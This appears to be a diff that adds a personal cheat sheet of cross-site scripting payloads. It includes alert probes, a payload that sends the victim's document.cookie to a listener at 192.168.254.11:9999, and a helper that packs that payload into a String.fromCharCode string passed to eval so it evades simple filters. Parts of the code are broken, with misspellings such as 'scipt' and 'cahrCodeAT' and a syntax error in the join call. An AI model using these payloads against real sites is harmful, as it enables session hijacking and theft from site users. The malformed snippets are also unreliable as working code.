@@ -1,0 +1,26 @@
+# Basic alert script
+<script>alert(1)</script>
+
+# 
+<BODY ONLOAD=alert('XSS')>
+
+# Validate that your browser will connect to that location
+<img src='http://192.168.254.11:999' />
+
+
+# 
+<scipt>document.write("<img src='http://192.168.254.11:9999/a.gif?x=" + escape(document.cookie) + "'>");</script>
+
+
+# Pack Javascript
+# This can be executed in chromium - console
+var ct = []
+pt = "document.write(\"<img src='http://192.168.254.11:9999/a.gif?x=\" + escape(document.cookie) + \"'>\");";
+pt.split('').forEach(function(c) {
+	ct.push(c.cahrCodeAT(0));
+});
+console.log(ct.join(,  "));
+
+# To use it
+<script>eval(String.fromCharCode(100, 111, 99...,41, 59));</script>
+
